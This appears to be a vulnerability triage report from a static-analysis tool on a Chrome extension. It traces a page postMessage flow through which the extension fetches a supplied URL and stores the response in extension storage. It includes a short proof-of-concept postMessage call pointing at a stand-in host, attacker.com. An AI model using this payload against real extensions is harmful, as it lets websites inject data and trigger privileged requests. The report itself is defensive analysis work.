# CoCo Analysis: poeghfopkomankboimkibohhaomlafpd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (2 unique flows: cs_window_eventListener_message → fetch_resource_sink + chrome_storage_sync_set_sink, fetch_source → chrome_storage_sync_set_sink)

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/poeghfopkomankboimkibohhaomlafpd/opgen_generated_files/cs_1.js
Line 470: window.addEventListener('message', (event) => {
Line 471: console.log('receiving message', event.data);
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/poeghfopkomankboimkibohhaomlafpd/opgen_generated_files/bg.js
Line 1082: if (request.policyFileUrl) {

**Code:**

```javascript
// Content script (cs_1.js) - Entry point
window.addEventListener('message', (event) => {
  console.log('receiving message', event.data); // ← attacker-controlled
  if (event.source == window
    && event.data
    && event.data.type === 'add-campaign-policy') {
    chrome.runtime.sendMessage(event.data); // ← attacker-controlled payload sent to background
  }
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener((request) => {
  if (request.policyFileUrl) { // ← attacker-controlled
    policyUrl = request.policyFileUrl;
    loadPolicy(policyUrl); // ← attacker-controlled URL
  }
});

// Background script - Fetch with attacker-controlled URL
const fetchPolicyFile = (policyFileUrl) => {
  return fetch(policyFileUrl) // ← SSRF: fetch to attacker-controlled URL
    .then(resp => resp.json())
};

var loadPolicy = (policyFileUrl) => {
  return fetchPolicyFile(policyFileUrl)
    .then(p => storePolicyForUser(p, policyFileUrl));
};

const storePolicyForUser = (policy, policyFileUrl) => {
  chrome.storage.sync.set({ policy, policyFileUrl, date: Date.now() }); // Also stores attacker data
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage (izens.net)

**Attack:**

```javascript
// On izens.net page, attacker can execute:
window.postMessage({
  type: 'add-campaign-policy',
  policyFileUrl: 'https://attacker.com/malicious-policy.json'
}, '*');

// The extension will:
// 1. Receive the message in content script
// 2. Forward to background script
// 3. Make privileged fetch() request to attacker.com
// 4. Store the response in chrome.storage.sync
```

**Impact:** SSRF vulnerability allowing privileged cross-origin requests to attacker-controlled URLs. The extension makes fetch requests with its elevated privileges (accessing internal networks, bypassing CORS), and stores attacker-controlled data in extension storage.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
Same as Sink 1 (same flow leads to both fetch and storage.set)

**Classification:** TRUE POSITIVE (covered by Sink 1 analysis)

---

## Sink 3: fetch_source → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/poeghfopkomankboimkibohhaomlafpd/opgen_generated_files/bg.js
Line 265: var responseText = 'data_from_fetch';

**Classification:** FALSE POSITIVE (referenced only CoCo framework code)

**Reason:** This trace only references CoCo's mock framework code at line 265 (before the 3rd "// original" marker at line 963). The actual extension code does have fetch → storage.set flow, but it's already covered by Sink 1 where the fetch URL itself is attacker-controlled, making it a TRUE POSITIVE for SSRF rather than just storage poisoning.
